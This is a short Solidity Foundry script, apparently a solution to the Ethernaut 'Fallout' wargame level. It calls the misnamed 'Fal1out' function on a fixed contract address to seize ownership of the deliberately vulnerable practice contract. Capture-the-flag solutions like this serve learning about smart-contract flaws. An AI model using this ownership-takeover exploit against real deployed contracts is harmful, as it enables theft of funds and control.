// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface IFallout {
  function Fal1out() external payable;
}

contract Solve is Script, Test {
  address target = address(0x8FF685f169F0A34Ab51D8408b88D986436F687EB);

  function run() public {
    vm.startBroadcast();

    (bool success, ) = target.call(abi.encodeWithSelector(IFallout.Fal1out.selector));
    emit log_named_bytes("Selector to call", abi.encodePacked(IFallout.Fal1out.selector));
    require(success, "Call failed");

    vm.stopBroadcast();
  }
}
